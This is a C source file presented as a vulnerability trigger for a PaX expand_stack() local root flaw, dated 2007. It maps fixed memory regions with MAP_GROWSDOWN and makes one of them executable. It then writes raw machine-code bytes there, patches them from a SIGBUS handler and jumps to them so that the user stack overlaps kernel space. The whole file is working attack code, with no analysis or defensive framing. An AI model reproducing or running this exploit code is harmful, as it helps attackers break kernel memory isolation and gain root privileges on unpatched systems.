/*
** expand_stack() PaX local root vulnerability
** Vulnerability trigger.
**
** Copyright (C) 2007
** Digital Armaments Inc. - www.digitalarmaments.com
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>
#include <asm/page.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define KBASE 0xc0000000
#define SEGMEXEC_TASK_SIZE (KBASE / 2)

#define LOSTPAGE_SIZE (PAGE_SIZE * 3)
#define MAP1_BASE 0x00004000
#define MAP2_BASE MAP1_BASE - LOSTPAGE_SIZE
#define PF_BASE MAP1_BASE + SEGMEXEC_TASK_SIZE - 0x4000

#define PAGE_GROW_NB 10

static char ucode [40] = "\xbe\x00\xF0\xFF\x5F\x83\x3e\x2a";

void mouarf (int signum)
{
char * str = (char *) (MAP1_BASE + 600);

memset ((void *)(MAP1_BASE + 600), 0x90, 40);
str [26] = 0xc3; /* ret */
return;
}

int main( void )
{
int i = 1;
void (* p)();

signal (SIGBUS, mouarf);

if( mmap( (void *) MAP1_BASE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( "mmap map1 base\n" );
return( 1 );
}

if( mmap( (void *) 0x0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_FIXED |
MAP_ANONYMOUS | MAP_PRIVATE | MAP_GROWSDOWN, 0, 0 ) == (void *) -1 )
{
perror( "mmap 0x0 failed\n" );
return( 1 );
}

if( mprotect( (void *) MAP1_BASE, PAGE_SIZE,
PROT_READ | PROT_WRITE | PROT_EXEC ) < 0 )
{
perror( "mprotect map1 base" );
fprintf( stderr, "run chpax -m on this executable\n" );
return( 1 );
}

* (int *) (ucode + 1) = (SEGMEXEC_TASK_SIZE - (PAGE_SIZE * i));
memcpy ((void *)(MAP1_BASE + 600), ucode, 20);
p = (void *) MAP1_BASE + 600;
printf ("--> about to fault on %X\n", SEGMEXEC_TASK_SIZE - (PAGE_SIZE * i));
p ();
printf ("Overlaping the kernel by %d pages\n", i);

fflush( stdout );

printf ("Calling munmap ... %X, %x\n", 0x2000, 0x1000);
if (munmap (0x2000, 0x1000) < 0 )
perror ("munmap");

// printf ("Calling mremap ... \n");
// if (mremap (0x2000, 0x1000, 0x10000, MREMAP_MAYMOVE) < 0 )
// perror ("mremap");

printf ("PID:%d, sleeping\n", getpid ());
sleep (2000);
return( 0 );
}
